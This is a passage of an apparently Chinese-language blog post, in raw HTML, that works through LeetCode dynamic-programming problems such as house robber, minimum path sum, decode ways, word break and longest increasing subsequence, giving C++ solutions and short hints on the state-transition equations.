dp[i - <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>解答二(空间压缩)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> prevPrev = <span class="number">1</span>, prev = <span class="number">1</span>, cur = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            cur = prevPrev + prev;</span><br><span class="line">            prevPrev = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>补充：典型的斐波拉契数列问题，可转化为dp[n]&#x3D;dp[n-1]+dp[n-2]。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/house-robber">打家劫舍</a><br>假如你是一个劫匪，并且决定抢劫一条街上的房子，每个房子内的钱财数量各不相同。如果你抢了两栋相邻的房子，则会触发警报机关。求在不触发机关的情况下最多可以抢劫多少钱。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> prevPrev = <span class="number">0</span>, prev = <span class="number">0</span>, cur = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            cur = <span class="built_in">max</span>(prevPrev + nums[i], prev);</span><br><span class="line">            prevPrev = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：状态转移方程为dp[n]&#x3D;max(dp[n-1], dp[n-2]+nums[n])。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/arithmetic-slices">等差数列划分</a><br>如果一个数列至少有三个元素，并且任意两个相邻元素之差相同，则称该数列为等差数列。例如，[1,3,5,7,9]、[7,7,7,7]和[3,-1,-5,-9]都是等差数列。<br>给你一个整数数组nums，返回数组nums中所有为等差数组的子数组个数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfArithmeticSlices</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] - nums[i - <span class="number">1</span>] == nums[i - <span class="number">1</span>] - nums[i - <span class="number">2</span>]) &#123;</span><br><span class="line">                ++k;</span><br><span class="line">                count += k;</span><br><span class="line">            &#125; <span class="keyword">else</span> k = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：状态转移方程为dp[n]&#x3D;dp[n-1]+1。</p></li></ul><h2 id="二、二维动态规划"><a href="#二、二维动态规划" class="headerlink" title="二、二维动态规划"></a>二、二维动态规划</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/minimum-path-sum">最小路径和</a><br>给定一个包含非负整数的mxn网格grid，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。<br><img src="https://assets.leetcode.com/uploads/2020/11/05/minpath.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="number">1</span> &amp;&amp; n == <span class="number">1</span>) <span class="keyword">return</span> grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] + grid[i][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][j] = dp[<span class="number">0</span>][j - <span class="number">1</span>] + grid[<span class="number">0</span>][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="type">int</span> minTrace = <span class="built_in">min</span>(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]);</span><br><span class="line">                dp[i][j] = grid[i][j] + minTrace;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：状态转移方程为dp[i][j]&#x3D;grid[i][j]+min(dp[i-1][j], dp[i][j-1])</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/01-matrix">01矩阵</a><br>给定一个由0和1组成的矩阵mat，请输出一个大小相同的矩阵，其中每一个格子是mat中对应位置元素到最近的0的距离。<br><img src="https://pic.leetcode-cn.com/1626667205-xFxIeK-image.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">updateMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;matrix) &#123;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>(), n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, numeric_limits&lt;<span class="type">int</span>&gt;::<span class="built_in">max</span>() - <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i - <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (j &gt; <span class="number">0</span>) dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][j - <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> dp[i][j] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &lt; m - <span class="number">1</span>) dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i + <span class="number">1</span>][j] + <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (j &lt; n - <span class="number">1</span>) dp[i][j] = <span class="built_in">min</span>(dp[i][j], dp[i][j + <span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要左上到右下，右下到左上各扫一遍。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/maximal-square">最大正方形</a><br>在一个由’0’和’1’组成的二维矩阵内，找到只包含’1’的最大正方形，并返回其面积。<br><img src="https://assets.leetcode.com/uploads/2020/11/26/max1grid.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> maxSide = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> m = matrix.<span class="built_in">size</span>(), n = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i - <span class="number">1</span>][j - <span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> minNum = <span class="built_in">min</span>(&#123;dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j - <span class="number">1</span>]&#125;);</span><br><span class="line">                    dp[i][j] = minNum + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                maxSide = <span class="built_in">max</span>(maxSide, dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxSide * maxSide;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：在右下角记录正方形的最大边，状态转移方程为dp[i][j]&#x3D;1+min({dp[i-1][j-1], dp[i-1][j], dp[i][j-1]})。</p></li></ul><h2 id="三、分割问题"><a href="#三、分割问题" class="headerlink" title="三、分割问题"></a>三、分割问题</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/perfect-squares?source=vscode">完全平方数</a><br>给你一个整数n，返回和为n的完全平方数的最少数量。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numSquares</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> minNum = <span class="number">10001</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j * j &lt;= i; ++j) &#123;</span><br><span class="line">                minNum = <span class="built_in">min</span>(minNum, dp[i - j * j]);</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = minNum + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：位置只依赖于i-j^2，因为这样才符合完全平方数分割。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/decode-ways?source=vscode">解码方法</a><br>已知字母 A-Z 可以表示成数字 1-26。给定一个数字串，求有多少种不同的字符串等价于这个数字串。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numDecodings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (s[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span> || s[<span class="number">0</span>] == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s[<span class="number">1</span>] &lt;= <span class="string">&#x27;6&#x27;</span>) ++dp[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (s[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>) dp[<span class="number">1</span>]--;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i - <span class="number">1</span>] &gt; <span class="string">&#x27;2&#x27;</span> || s[i - <span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> dp[i] = dp[i - <span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i - <span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span> || s[i - <span class="number">1</span>] == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">                    dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">                <span class="keyword">else</span>  dp[i] = dp[i - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意状态转移方程不止一种。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/word-break?source=vscode">单词拆分</a><br>给你一个字符串s和一个字符串列表wordDict作为字典。如果可以利用字典中出现的一个或多个单词(可以重复使用)拼接出s则返回true。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">dp</span><span class="params">(size + <span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= size; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">const</span> string&amp; word : wordDict) &#123;</span><br><span class="line">                <span class="type">int</span> length = word.<span class="built_in">length</span>();</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= length &amp;&amp; s.<span class="built_in">substr</span>(i - length, length) == word) </span><br><span class="line">                    dp[i] = dp[i - length];</span><br><span class="line">                <span class="keyword">if</span> (dp[i]) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[size];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：和完全平方数差不多，位置只依赖于i-word.length。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/filling-bookcase-shelves?source=vscode">填充书架</a><br>给定一个数组，每个元素代表一本书的厚度和高度。问对于一个固定宽度的书架，如果按照数组中书的顺序从左到右、从上到下摆放，最小总高度是多少。<br><img src="https://assets.leetcode.com/uploads/2019/06/24/shelves.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minHeightShelves</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; books, <span class="type">int</span> shelfWidth)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = books.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> w = books[i - <span class="number">1</span>][<span class="number">0</span>], h = books[i - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + h;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i - <span class="number">1</span>; j &gt; <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="type">int</span> prevW = books[j - <span class="number">1</span>][<span class="number">0</span>], prevH = books[j - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">                w += prevW;</span><br><span class="line">                <span class="keyword">if</span> (w &gt; shelfWidth) <span class="keyword">break</span>;</span><br><span class="line">                h = <span class="built_in">max</span>(prevH, h);</span><br><span class="line">                dp[i] = <span class="built_in">min</span>(dp[i], h + dp[j - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：摆放只有两种情况，摆在前一本书后面或者直接摆在下一层。</p></li><li><p>题目五：<a href="https://leetcode.cn/problems/combination-sum-iv?source=vscode">组合总和 Ⅳ</a><br>给定一个不重复数字的数组和一个目标数，求加起来是目标数的所有排列的总数量。(虽然这道题叫做Combination Sum，但是不同顺序的组合会被当作不同答案，因此本质上是排列)</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">combinationSum4</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(target + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= target; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">                <span class="keyword">if</span> (num &lt;= i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (dp[i] &gt; __INT_MAX__ - dp[i - num]) <span class="keyword">break</span>;</span><br><span class="line">                    dp[i] += dp[i - num];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：和完全平方数也是差不多的，这里为了全用int来完成时间上会稍稍多一点，可以换成double类型去掉多的if判断。</p></li></ul><h2 id="四、子序列问题"><a href="#四、子序列问题" class="headerlink" title="四、子序列问题"></a>四、子序列问题</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/longest-increasing-subsequence">最长递增子序列</a><br>给你一个整数数组nums，找到其中最长严格递增子序列的长度。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> maxTemp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt;= <span class="number">0</span>; --j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] &gt; nums[j])</span><br><span class="line">                    maxTemp = <span class="built_in">max</span>(maxTemp, dp[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = maxTemp + <span class="number">1</span>;</span><br><span class="line">            res = <span class="built_in">max</span>(dp[i], res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：这道题很简单，但是动态规划并不是最优解。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/longest-common-subsequence">最长公共子序列</a><br>给定两个字符串text1和text2，返回这两个字符串的最长公共子序列的长度。如果不存在公共子序列，返回0。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 